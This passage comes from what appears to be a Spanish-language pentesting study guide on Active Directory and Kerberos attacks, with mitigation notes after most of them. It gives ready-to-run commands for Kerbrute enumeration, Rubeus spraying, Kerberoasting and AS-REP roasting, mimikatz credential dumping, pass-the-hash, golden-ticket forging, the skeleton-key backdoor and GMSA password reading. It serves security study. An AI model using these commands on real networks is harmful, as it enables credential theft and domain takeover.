+<p><strong>Nota: Dentro de los recolectores disponibles específicamente de <code>SharpHound.ps1</code> y <code>SharpHound.exe</code> se han notado diferencias en como es graficada y recopilada la información, por lo que durante el recopilado de información se sugiere realizar dos recopilados, ejecutando <code>SharpHound.exe</code> sin ningún parámetro y <code>SharpHound.ps1</code> o <code>SharpHound.exe</code> específicando los métodos de recolección (<code>CollectionMethod</code>, etc.).</strong></p>
+<h5 id="carga-de-información"><a class="header" href="#carga-de-información">Carga de información</a></h5>
+<p>Seleccionar <code>Upload Data</code> ubicado en el menú de la derecha de BloodHound y seleccionar el zip extraído.</p>
+<p><img src="images/bloodhound-upload.png" alt="BloodHound Upload Data" /></p>
+<p>Al terminar la carga del zip se podrá visualizar la información recopilada, exponiendo rutas potenciales de escalación y como ejecutarlas.</p>
+<p><img src="images/bloodhound-database.png" alt="BloodHound Base de Datos" /></p>
+<h3 id="ataques"><a class="header" href="#ataques">Ataques</a></h3>
+<h4 id="privilege-requirements"><a class="header" href="#privilege-requirements">Privilege Requirements</a></h4>
+<ul>
+<li>Kerbrute Enumeration - No es necesario el acceso al dominio.</li>
+<li>Pass the Ticket - Es necesario el acceso a un usuario del dominio.</li>
+<li>Kerberoasting - Es necesario el acceso de cualquier usuario.</li>
+<li>AS-REP Roasting - Es necesario el acceso de cualquier usuario.</li>
+<li>Golden Ticket - Es necesario acceso completo al dominio (domain admin).</li>
+<li>Silver Ticket - Es necesario un hash de servicio.</li>
+<li>Skeleton Key - Es necesario acceso completo al dominio (domain admin).</li>
+</ul>
+<p><strong>Nota: antes de iniciar cualquier testeo es necesario registrar el nombre de dominio en la máquina (<code>/etc/hosts</code>), de lo contrario se esperaría un comportamiento no esperado o simplemente no funcionar.</strong></p>
+<h4 id="abusing-pre-authentication"><a class="header" href="#abusing-pre-authentication">Abusing Pre-Authentication</a></h4>
+<p>Al ejecutar fuerza bruta a la pre-autenticación de Kerberos, no se disparan eventos de error de autenticación (en el logueo), lo que se convertiría en indicadores para el blue team.
+Cuando se realiza fuerza bruta a través de Kerberos, se puede realizar mandando sólo un frame UDP al KDC permitiéndonos enumerar usuarios.</p>
+<h5 id="kerbrute"><a class="header" href="#kerbrute">Kerbrute</a></h5>
+<p>Para encontrar posibles usuarios a usar para obtener acceso a la red, se puede hacer uso de <a href="https://github.com/ropnop/kerbrute">Kerbrute</a> haciendo uso de una lista preestablecida de usuarios a probar.</p>
+<pre><code class="language-bash">./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local users.txt
+</code></pre>
+<p><img src="images/kerbrute.png" alt="Uso de Kerbrute" /></p>
+<h4 id="harvesting--brute-forcing-tickets"><a class="header" href="#harvesting--brute-forcing-tickets">Harvesting &amp; Brute-Forcing Tickets</a></h4>
+<h5 id="rubeus"><a class="header" href="#rubeus">Rubeus</a></h5>
+<p>Rubeus cuenta con una amplia gama de ataques y características que la permiten ser una herramienta muy versátil para realizar ataques contra Kerberos. Dentro de las herramientas y ataques que incluye se encuentran overpass the hash, renovación y requests de tickets, gestión de tickets, extracción de tickets, harvesting, pass the ticket, AS-REP Roasting y Kerberoasting.</p>
+<p><a href="https://github.com/GhostPack/Rubeus">Repositorio de Rubeus.</a></p>
+<p><a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries">Repositorio de binarios de Rubeus.</a></p>
+<h5 id="harvesting"><a class="header" href="#harvesting">Harvesting</a></h5>
+<p>Haciendo uso del comando:</p>
+<pre><code class="language-powershell">Rubeus.exe harvest /interval:30
+</code></pre>
+<p>Rubeus recopilará TGTs cada 30 segundos.</p>
+<p><img src="images/rubeus-harvest.png" alt="Opción harvest de Rubeus" /></p>
+<h5 id="brute-forcing--password-spraying"><a class="header" href="#brute-forcing--password-spraying">Brute-Forcing | Password-Spraying</a></h5>
+<p>Rubeus puede ser usado para hacer fuerza bruta de contraseñas como para hacer password spraying en las cuentas.</p>
+<p>Este ataque tomará la contraseña basada en Kerberos y realizar un spray en todos los usuarios encontrados proporcionando un ticket <code>.kirbi</code>. Este ticket es un TGT que puede ser usado para obtener tickets de servicio del KDC así como usarlo en los ataques así como el ataque pass the ticket.</p>
+<p>Antes de ejecutar un spray de contraseñas se necesita añadir el nombre de dominio al archivo de host de windows usando <code>echo 10.10.116.144 CONTROLLER.local &gt;&gt; C:\Windows\System32\drivers\etc\hosts</code></p>
+<p>Ejecutando <code>Rubeus.exe brute /password:Password1 /noticket</code> se usará la contraseña proveída y realizará un spray a todos los usuarios que se encuentren y con esto se obtendrá un TGT <code>.kirbi</code> para ese usuario.</p>
+<p><img src="images/rubeus-spray.png" alt="Opción spray de Rubeus" /></p>
+<p>Considerar la ejecución del ataque ya que puede ocasionar el bloqueo de cuentas, dependiendo de las políticas de las cuentas.</p>
+<h4 id="kerberoasting"><a class="header" href="#kerberoasting">Kerberoasting</a></h4>
+<p>Kerberos in a nutshell:</p>
+<ol>
+<li>Cuando un usuario se loguea en el Active Directory, el usuario se autentica contra el Domain Controller (DC) usando su contraseña.</li>
+<li>El DC le envía al usuario un Ticket Granting Ticket (TGT - Kerberos). El TGT es presentado a cualquier DC para probar la autenticación con un ticket de servicio de Kerberos.</li>
+<li>El usuario abre Skype lo cual causa que la estación de trabajo (computadora cliente) busqué el Service Principal Name (SPN) para el servidor de Exchange de usuarios.</li>
+<li>Una vez que el SPN es identificado, la computadora se comunica con el DC de nuevo y presenta el TGT del usuario así como también el SPN del recurso al cual el usuario se necesita comunicar.</li>
+<li>El DC responde con el  Ticket Granting Service (TGS) de Kerberos.</li>
+<li>La estación de trabajo del usuario presenta el TGS al servidor de Exchange para obtener acceso.</li>
+<li>Skype se conecta satisfactoriamente.</li>
+</ol>
+<p><img src="images/kerberoasting-diagram.png" alt="Diagrama Kerberoasting" /></p>
+<h5 id="ejecución---rubeus"><a class="header" href="#ejecución---rubeus">Ejecución - Rubeus</a></h5>
+<p>Haciendo uso de:</p>
+<pre><code class="language-powershell">Rubeus.exe kerberoast # Como Administrator
+Rubeus.exe kerberoast /creduser:htb.local\amanda /credpassword:Password123
+</code></pre>
+<p>Se permite el dumpeo de los usuarios aplicables.</p>
+<p><img src="images/kerberoasting-rubeus.png" alt="Kerberoast con Rubeus" /></p>
+<h5 id="ejecución---impacket"><a class="header" href="#ejecución---impacket">Ejecución - Impacket</a></h5>
+<p>Habiendo conseguido las credenciales de un usuario válido de la máquina se puede ejecutar el ataque haciendo uso de:</p>
+<pre><code class="language-bash">impacket-GetUserSPNs {dominio/usuario:contraseña} -dc-ip {ip de dominio} -request
+</code></pre>
+<p><img src="images/kerberoasting.png" alt="Ejecución de GetUserSPNs" /></p>
+<p><em>Nota: si se identifica un error similar a <code>[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code> basta con ejecutar <code>ntpdate &lt;HOST&gt;</code> para sincronizar la hora del sistema con la del servidor.</em></p>
+<h5 id="crackeo"><a class="header" href="#crackeo">Crackeo</a></h5>
+<p>Después de conseguir el hash, se puede buscar crackearlo (ejemplo empleado con <code>hashcat -m 13100 kerberos.hash rockyou.txt</code> )</p>
+<p><img src="images/kerberoasting-crack.png" alt="Crackeo de kerberos hash" /></p>
+<h5 id="qué-puede-hacer-una-cuenta-de-servicio"><a class="header" href="#qué-puede-hacer-una-cuenta-de-servicio">¿Qué puede hacer una cuenta de servicio?</a></h5>
+<p>Después de crackear una constraseña de la cuenta de un servicio existen varias formas de exfiltrar datos o recolectar información relevante dependiendo de si la cuenta obtenida es un domain admin o no.</p>
+<p>Si la cuenta de servicio es un domain admin el control es similar a cuando se tiene un golden/silver ticket pudiendo obtener los contenidos de <code>NTDS.dit</code>.</p>
+<p>Si la cuenta de servicio no es un domain admin se puede usar para loguearse en otros clientes/sistemas y pivotear o escalar o validar que esa contraseña crackeada sea reciclada para otro servicio o cuenta de usuario.</p>
+<h5 id="mitigación"><a class="header" href="#mitigación">Mitigación</a></h5>
+<ul>
+<li>Contraseñas fuertes.</li>
+<li>Principio del privilegio mínimo (en el ejemplo se configuró un servicio el cuál tiene permisos de administrador de dominio, siendo esto una configuración común no apropiada).</li>
+</ul>
+<h4 id="as-rep-roasting"><a class="header" href="#as-rep-roasting">AS-REP Roasting</a></h4>
+<p>Este método al igual que en Kerberoasting es usado para obtener los hashes krbasrep5 de cuentas de usuario que tienen la pre-autenticación de Kerberos deshabilitada.</p>
+<p>A diferencia de Kerberoasting estos usuarios no necesitan ser cuentas de servicios, el único requisito es que el usuario debe tener la pre-autenticación deshabilitada.</p>
+<h5 id="overview"><a class="header" href="#overview">Overview</a></h5>
+<p>Mientras se realiza la pre-autenticación, el hash de los usuarios será usado para cifrar un timestamp que el DC intentará decifrar para validar que es el hash correcto el que se está usando. Después de validar el timestamp el KDC generará un TGT para el usuario. Si la pre-autenticación está deshabilitada se puede solicitar cualquier data de autenticación para cualquier usuario y el KDC retornará un TGT cifrado que puede ser crackeado offline debido a que el KDC salta el paso de validación que verifica que el usuario es quien dice ser.</p>
+<h5 id="ejecución---rubeus-1"><a class="header" href="#ejecución---rubeus-1">Ejecución - Rubeus</a></h5>
+<p>Haciendo uso de <code>Rubeus.exe asreproast</code> permite buscar usuarios vulnerables para extraer el hash del usuario vulnerable encontrado.</p>
+<p><img src="images/asrep-rubeus.png" alt="AS-REP Roast con Rubeus" /></p>
+<h5 id="ejecución---impacket-1"><a class="header" href="#ejecución---impacket-1">Ejecución - Impacket</a></h5>
+<p>Impacket permite dos alcances añadiendole un valor extra al método, proponiendo 2 escenarios para la ejecución (es necesario contar con una lista de usuarios potenciales o bien usar un diccionario):</p>
+<ol>
+<li>(Recomendada) Dando una lista de usuarios existentes en el sistema, es decir, hacer previamente enumeración de usuarios con Kerbrute, de esta manera sólo se realizará la búsqueda de usuarios vulnerables.</li>
+<li>Proporcionar un diccionario de usuarios sin realizar la validación de su existencia, de esta manera impacket verificará la existencia del usuario antes de buscar la vulnerabilidad.</li>
+</ol>
+<p>Haciendo uso de <code>impacket-GetNPUsers {dominio/usuario:contraseña} -dc-ip {ip de dominio} -no-pass</code> (uso dependiente de escenario).</p>
+<p>Habiendo realizado antes la enumeración de usuarios existentes el comando:</p>
+<pre><code class="language-bash">for user in $(cat users.txt); do impacket-GetNPUsers -dc-ip &lt;ip de dominio&gt; &lt;dominio&gt;/${user} -no-pass | grep -v Impacket; done
+</code></pre>
+<p>Se realiza un filtrado conveniente para identificar la vulnerabilidad.</p>
+<p><img src="images/asrep-impacket.png" alt="AS-REP Roast con Impacket" /></p>
+<ol>
+<li>Enumeración de usuarios.</li>
+<li>Uso de impacket.</li>
+</ol>
+<h5 id="crackeo-1"><a class="header" href="#crackeo-1">Crackeo</a></h5>
+<p>Después de conseguir el hash, si se desea usar hashcat para crackearlo es necesario concatenar <code>23$</code> después de <code>$krb5asrep$</code> obteniendo algo como <code>$krb5asrep$23$User...</code> usando <code>hashcat -m 18200 asrep.hash rockyou.txt</code> )</p>
+<p><img src="images/asrep-crack.png" alt="Crackeo de hash obtenido por AS-REP roast" /></p>
+<h5 id="mitigación-1"><a class="header" href="#mitigación-1">Mitigación</a></h5>
+<ul>
+<li>Mantener una política de contraseñas fuertes.</li>
+<li>No deshabilitar la pre-autenticación de Kerberos a menos que sea necesario.</li>
+</ul>
+<h4 id="pass-the-ticket"><a class="header" href="#pass-the-ticket">Pass The Ticket</a></h4>
+<h5 id="overview-1"><a class="header" href="#overview-1">Overview</a></h5>
+<p>Este método está basado en extraer el TGT de la memoria LSASS de la máquina. El Local Security Authority Subsystem Service (LSASS) es un proceso de memoria que guarda credenciales en el servidor de directorio activo y puede guardar tickets de Kerberos junto con otro tipo de credenciales por lo que actúa como portero aceptando o rechazando las credenciales que reciba. Lost tickets de Kerberos se pueden extraer de la memoria LSASS al igual como los hashes.</p>
+<p>Al extraer los tickets con mimikatz se obtendrá un ticket <code>.kirbi</code> que puede ser usado para ganar acceso como domain admin si un ticket de un domain admin se encuentra en la memoria LSASS. Este ataque es ideal como técnica para hacer escalación de privilegios y movimiento lateral si se encuentran disponibles tickets no asegurados de una cuenta de servicio de dominio.</p>
+<p>El ataque permite escalar a domain admin si se extrae un ticket del mismo para impersonar ese ticket usando el ataque PTT de mimikatz permitiendo actuar como domain admin.</p>
+<h5 id="ejecución-3"><a class="header" href="#ejecución-3">Ejecución</a></h5>
+<p>Con <code>sekurlsa::tickets /export</code> se exportará los tickets .kirbi al directorio donde actualmente se encuentre.</p>
+<p><img src="images/passticket-1.png" alt="Exportación de TGT" /></p>
+<p>Después de identificar un ticket que se pueda utilizar se usa <code>kerberos::ptt &lt;ticket&gt;</code> siendo el ticket el archivo que se exportó previamente y con <code>klist</code> fuera de mimikatz se nos permite validar que el usuario se haya cargado correctamente.</p>
+<h5 id="mitigación-2"><a class="header" href="#mitigación-2">Mitigación</a></h5>
+<ul>
+<li>Evitar que los domain admins se logueen a nada que no sea el domain controller ya que a pesar de ser algo simple es fácil caer en la mala práctica de loguearse en computadoras &quot;low-level&quot; dejando tickets abriendo posibilidad al uso del ataque.</li>
+</ul>
+<h4 id="pass-the-hash"><a class="header" href="#pass-the-hash">Pass The Hash</a></h4>
+<p>Se refiere a que si se llega a crackear contraseña y/o se obtienen hashes SAM, se pueden aprovechar ambas para realizar movimiento lateral a través de la red.</p>
+<p>Haciendo uso de <code>crackmapexec</code> se pueden validar las credenciales previamente crackeadas en un host en específico o en un segmento de red.</p>
+<p>Utilizando:</p>
+<p><code>crackmapexec {protocolo} {ip/rango} -u {usuario} -d {dominio} -p {contraseña}</code></p>
+<p>Donde protocolo puede ser <code>{smb, winrm, ssh, mssql, ldap}</code></p>
+<p>Ejemplo:</p>
+<p><img src="images/crackmapexec.png" alt="Ejemplo crackmapexec" /></p>
+<p>O bien, con el hash obtenido se puede loguear a la cuenta igualmente usando <code>crackmapexec</code>.</p>
+<p><code>crackmapexec {protocolo} {ip/rango} -u {usuario} -H {hash} --local-auth</code></p>
+<p>Ejemplo:</p>
+<p><img src="images/crackmapexec-hashdump.png" alt="Obtención de hashes con metasploit" /></p>
+<p><img src="images/crackmapexec-passhash.png" alt="Pass The Hash" /></p>
+<h5 id="dumpeo-de-hashes"><a class="header" href="#dumpeo-de-hashes">Dumpeo de hashes</a></h5>
+<p>Haciendo uso de <code>impacket-secretsdump</code> se puede loguear en la cuenta y máquina objetivo para obtener los hashes existentes.</p>
+<p><img src="images/secretsdump.png" alt="Secretsdump" /></p>
+<p>Posteriormente ejecutando <code>hashcat</code> se puede buscar crackear la colección de hashes obtenidos indicándolo en las banderas.</p>
+<p><code>.\hashcat.exe -m {# hashmode} {archivo de hashes} {diccionario}</code></p>
+<p><img src="images/hashcat.png" alt="Cracking de hashes con hashcat" /></p>
+<p>Para buscar obtener una shell se puede usar <code>impacket-psexec</code>, <code>impacket-smbexec</code> o <code>impacket-wmiexec</code> pasándole el hash obtenido para autenticarse con él en lugar de la contraseña.</p>
+<p>Ejemplo:</p>
+<p><code>impacket-psexec Gwyn:@192.168.111.145 -hashes {valor}</code></p>
+<p>TODO: Agregar imagen</p>
+<h5 id="mitigaciones"><a class="header" href="#mitigaciones">Mitigaciones</a></h5>
+<p>Es difícil de prevenir por completo, pero se le puede hacer más difícil a un atacante:</p>
+<ul>
+<li>Limitar reusos en las cuentas:
+<ul>
+<li>Evitar reusar la contraseña del administrador local.</li>
+<li>Deshabilitar las cuentas de Guest y Administrator.</li>
+<li>Limitar al administrador local (privilegios mínimos).</li>
+</ul>
+</li>
+<li>Usar contraseñas fuertes:
+<ul>
+<li>Entre más largas mejor (mayor a 14 caracteres).</li>
+<li>Evitar usar palabras comúnes.</li>
+<li>Oraciones largas.</li>
+</ul>
+</li>
+<li>Privilege Access Management (PAM)
+<ul>
+<li>Check out/in cuentas sensibles cuando sea necesario.</li>
+<li>Rotar contraseñas automáticamente en el check out y check in.</li>
+</ul>
+</li>
+</ul>
+<h4 id="token-impersonation"><a class="header" href="#token-impersonation">Token Impersonation</a></h4>
+<p>Los tokens son llaves temporales que permiten el acceso a un sistema o red sin tener que proveer credenciales cada vez que se accede a un archivo (como las cookies de una computadora).</p>
+<p>Tipos:</p>
+<ul>
+<li>Delegate. Creados para loguearse a una máquina o para usar escritorio remoto.</li>
+<li>Impersonate. &quot;non-interactive&quot; tal como agregar una unidad de red o un script de logueo de dominio.</li>
+</ul>
+<h5 id="ejecución-4"><a class="header" href="#ejecución-4">Ejecución</a></h5>
+<p>TODO</p>
+<h6 id="metasploit"><a class="header" href="#metasploit">Metasploit</a></h6>
+<p>Se encuentra disponible el módulo <code>incognito</code> el cual se puede cargar a una sesión de meterpreter con <code>load incognito</code>.</p>
+<p><img src="images/incognito-help.png" alt="Comandos de incognito" /></p>
+<p>Para visualizar los tokens que se encuentran actualmente en la máquina se hace uso de <code>list_tokens -u</code> (pudiendo visualizar tokens no sólo de usuarios si no de grupos lo que es indicado con la bandera agregada <code>-u</code>).</p>
+<p><img src="images/tokens.png" alt="Tokens disponibles" /></p>
+<p>Para poder utilizar el token se ocupa <code>impersonate_token {usuario}</code>.</p>
+<p><img src="images/impersonate.png" alt="Uso de impersonate token" /></p>
+<p><em>Nota: Los tokens son válidos hasta el reinicio de una máquina.</em></p>
+<h6 id="non-metasploit"><a class="header" href="#non-metasploit">Non-metasploit</a></h6>
+<p>Haciendo uso de ataques de tipo Juicy, Rotten y Lonely Potatoe.</p>
+<h5 id="mitigación-3"><a class="header" href="#mitigación-3">Mitigación</a></h5>
+<ul>
+<li>Limitar permiso de creación de tokens usuario/grupo.</li>
+<li>Gestionar niveles de cuenta (account tiering).</li>
+<li>Restricción a administrador local.</li>
+</ul>
+<h4 id="group-policy-preferences-gpp---aka-ms14-025"><a class="header" href="#group-policy-preferences-gpp---aka-ms14-025">Group Policy Preferences (GPP) - AKA MS14-025</a></h4>
+<ul>
+<li>Las Group Policy Preferences permiten a los administradores crear políticas usando credenciales embebidas.</li>
+<li>Estas credenciales son cifradas y almacenadas en una &quot;cPassword&quot;.</li>
+<li>La llave fue accidentalmente lanzada (whoops).</li>
+<li>Parchada en MS14-025 pero no previene usos previos.</li>
+</ul>
+<h5 id="ejecución-5"><a class="header" href="#ejecución-5">Ejecución</a></h5>
+<p>La vulnerabilidad radica en que la llave de cifrado es pública, por lo que si se llega a obtener el valor de lo que cifra, es decir, <code>cpassword</code> se encuentra expuesta a descifrarse, haciendo uso de <code>gpp-decrypt</code>. Ver referencias y write-up de máquina Active de HTB para más información.</p>
+<h4 id="mimikatz"><a class="header" href="#mimikatz">Mimikatz</a></h4>
+<ul>
+<li>Herramienta empleada para ver y obtener credenciales, generar tickets de Kerberos.</li>
+<li>Recupera credenciales alojadas en memoria.</li>
+<li>Permite ejecutar ataques: Credential Dumping, Pass-the-Hash, Over-Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket.</li>
+</ul>
+<h5 id="credential-dumping"><a class="header" href="#credential-dumping">Credential Dumping</a></h5>
+<ul>
+<li>Bypass de protección y acceso a memoria: <code>privilege::debug</code>.</li>
+<li>Extracción de información de cuentas logueadas desde el último reinicio (hashes NTLM):  <code>sekurlsa::logonpasswords</code>.</li>
+<li>Dumpeo de SAM: <code>lsadump::sam</code> | <code>lsadump::sam /patch</code>.</li>
+<li>Dumpeo de LSA: <code>lsadump::lsa /patch</code>. <em>LSA (Local Security Authority) subsistema protegido de autenticación de windows, autentica y crea sesiones de logueo en la computadora local.</em></li>
+</ul>
+<h4 id="goldensilver-tickets"><a class="header" href="#goldensilver-tickets">Golden/Silver Tickets</a></h4>
+<p>Un silver ticket en ocasiones puede ser empleado en vez de un golden ticket debido a que es más discreto. Si ser sigiloso y permanecer sin ser detectado importa para el ejercicio, esta opción resulta más conveniente que un golden ticket sin embargo, el proceso a realizar para generar uno es el mismo. La diferencia principal es que el silver ticket está limitado al servicio al que se utilizó como objetivo por lo que en el golden ticket se tiene acceso a cualquier servicio de Kerberos.</p>
+<p>Un escenario específico para un silver ticket podría presentarse al querer el acceso al servidor SQL del dominio sin embargo se comprometió un usuario el cual no tiene acceso a ese servidor. Se encuentra una cuenta de servicio accesible para obtener el primer contacto por medio de kerberoasting a el servicio para extraer el hash del servicio e impersonar su TGT para poder solicitar un ticket de servicio para el servicio SQL del KDC permitiendo así el acceso al servidor SQL del dominio.</p>
+<h5 id="krbtgt-overview"><a class="header" href="#krbtgt-overview">KRBTGT Overview</a></h5>
+<p>Para ayudar a compreder como funcionan estos ataques es importante entender la diferencia entre KRBTGT y TGT. KRBTGT es una cuenta de servicio para el KDC (Key Distribution Center) este genera todos los tickets de los clientes. Si se impersona esta cuenta y se crea un golden ticket de la KRBTGT significa que se tiene la habilidad de crear un ticket de servicio de cualquier cosa que se desee. Un TGT es un ticket asignado a una cuenta de servicio generado por el KDC y sólo se puede tener acceso a ese servicio, lo que en el escenario planteado representaría un  ticket del servicio SQL por ejemplo.</p>
+<h5 id="attack-overview"><a class="header" href="#attack-overview">Attack Overview</a></h5>
+<p>En el ataque se extrae un TGT para cualquier usuario de dominio que preferentemente se buscaría un domain admin, sin embargo para un golden ticket se buscaría extraer el ticket krbtgt y para un silver ticket se buscaría extraer un ticket de cualquier servicio o de un domain admin. Esto proveería con el SID (Security Identifier) de la cuenta objetivo (de servicio o domain admin) que es único para cada cuenta.</p>
+<h5 id="ejecución-6"><a class="header" href="#ejecución-6">Ejecución</a></h5>
+<p>Para realizar el procedimiento es necesario obtener el identificador el dominio y el hash NTLM de la cuenta de krbtgt, obteniéndolo mediante <code>lsadump::lsa /inject /name:krbtgt</code> en mimikatz. En el caso de se opte por un silver ticket se necesitaría cambiar el parámetro <code>/name:&lt;cuenta&gt;</code> para extraer el hash de una cuenta domain admin o una cuenta de servicio.</p>
+<p><img src="images/golden-sid.png" alt="SID y Hash NTLM de krbtgt" /></p>
+<p>Ejecutar <code>kerberos::golden /User:&lt;nombre de usuario&gt; /domain:&lt;dominio&gt; /sid:&lt;sid extraido&gt; /krbtgt:&lt;hash NTLM&gt; /id:&lt;rid&gt; /ptt</code> (Usando <code>/ptt</code> para inyectarlo en la sesión actual o sin la bandera para extraerlo a un archivo). Ejemplo <code>kerberos::golden /User:Administrator /domain:dsouls.local /sid:S-1-5-21-1128842135-684543689-3182004798 /krbtgt:cbb7b576e46b82269910709d9d92ef2d /id:500 /ptt</code>.</p>
+<p>Para crear un silver ticket se sustituiría el hash NTLM del servicio en <code>/krbtgt:&lt;hash&gt;</code> el SID del servicio en <code>/sid:&lt;sid&gt;</code> y cambiar el id por <code>/id:1103</code>.</p>
+<p><img src="images/golden-ticket.png" alt="Golden ticket generado" /></p>
+<p>TODO: Verificar la inyección del ticket desde fuera.</p>
+<p>Levantar una sesión cmd con el ticket creado: <code>misc::cmd</code>.
+Visualizar contenido de un cliente perteneciente al dominio: <code>dir \\SITH\c$</code>
+Obtener una shell interactiva en cliente remoto con <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite">psexec</a>: <code>psexec.exe \\SITH cmd.exe</code></p>
+<p><img src="images/psexec-exe.png" alt="Sesión con ticket creado y ejecución de psexec" /></p>
+<h4 id="kerberos-backdoors"><a class="header" href="#kerberos-backdoors">Kerberos Backdoors</a></h4>
+<p>Existe una forma más sutil de realizar un ataque similar al del golden y silver ticket  ya que actúa similar a un rootkit implantandose por si mismo en la memoria en el domain forest permitiéndose acceso a cualquier máquina usando una contraseña maestra.</p>
+<p>La skeleton key abusa la forma en la que AS-REQ valida los timestamps cifrados y sólo funciona usando el cifrado RC4 de Kerberos.</p>
+<p>El hash por defecto para una skeleton key de mimikatz es <code>60BA4FCADC466C7A033C178194C03DF6</code> que resulta en la contraseña <em>mimikatz</em>.</p>
+<h5 id="skeleton-key-overview"><a class="header" href="#skeleton-key-overview">Skeleton Key Overview</a></h5>
+<p>De acuerdo a lo antes mencionado, el timestamp es cifrado con el hash NT de los usuarios. El domain controller después intenta descifrar el timestamp con el hash NT del usuario, una vez que la skeleton key sea implantada en el domain controller trata de decifrar el timestamp usando el hash NT del usuario y el hash NT de la skeleton key permitiendo el acceso al domain forest.</p>
+<h5 id="ejecución-7"><a class="header" href="#ejecución-7">Ejecución</a></h5>
+<p><code>misc::skeleton</code></p>
+<p>TODO: evidencia</p>
+<h4 id="abusando-de-aclsaces"><a class="header" href="#abusando-de-aclsaces">Abusando de ACLs/ACEs</a></h4>
+<h5 id="readgmsapassword"><a class="header" href="#readgmsapassword">ReadGMSAPassword</a></h5>
+<p>Un atacante puede leer la contraseña GMSA para la cuenta que es aplicada la ACE.</p>
+<pre><code class="language-powershell"># Save the blob to a variable
+$gmsa = Get-ADServiceAccount -Identity 'Target_Account' -Properties 'msDS-ManagedPassword'
+$mp = $gmsa.'msDS-ManagedPassword'
+
+# Decode the data structure using the DSInternals module
+ConvertFrom-ADManagedPasswordBlob $mp
+# Build a NT-Hash for PTH
+(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash
+# Alterantive: build a Credential-Object with the Plain Password
+$cred = new-object system.management.automation.PSCredential &quot;Domain\Target_Account&quot;,(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
+# Visualizar la contraseña en texto claro
+ConvertTo-SecureString $mp -AsPlainText -Force
+</code></pre>
+<h2 id="referencias"><a class="header" href="#referencias">Referencias</a></h2>
+<ul>
+<li><a href="https://adam-toscher.medium.com/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa">Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition)</a>.</li>
+<li><a href="https://dirkjanm.io/worst-of-both-worlds-ntlm-relaying-and-kerberos-delegation/">NTLM relaying and Kerberos delegation</a>.</li>
+<li><a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">PowerView CheatSheet</a>.</li>
+<li><a href="https://medium.com/@Shorty420/kerberoasting-9108477279cc">Kerberoasting your way in</a>.</li>
+<li><a href="https://www.rapid7.com/blog/post/2016/07/27/pentesting-in-the-real-world-group-policy-pwnage/">Pentesting in the Real World: Group Policy Pwnage</a>.</li>
+<li><a href="https://github.com/srrequiem/SecNotes/blob/main/HTB/Boxes/Windows/1_Easy/Active/htb_active.md">Ejercicio GPP - HTB Active</a>.</li>
+<li><a href="https://tryhackme.com/room/attackingkerberos">Attacking Kerberos - TryHackMe</a></li>
+<li><a href="https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a">Pass-The-Ticket (PTT) attack in Mimikatz (and a Gotcha!)</a></li>
+<li><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat">AS-REP Roasting</a></li>
+<li><a href="https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1">Kerberoasting Revisited</a></li>
+<li><a href="https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/">Not A Security Boundary: Breaking Forest Trusts</a></li>
+<li><a href="https://www.varonis.com/blog/kerberos-authentication-explained">Kerberos Authentication Explained</a></li>
+<li><a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don&#x27;t-Get-It-wp.pdf">Abusing Kerberos</a></li>
+<li><a href="https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf">Kerberos &amp; Attacks 101</a></li>
+<li><a href="https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword">ReadGMSAPassword</a></li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../guides/active_directory/0_general.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="../../guides/ecpptv2_lab/index.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../guides/active_directory/0_general.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="../../guides/ecpptv2_lab/index.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
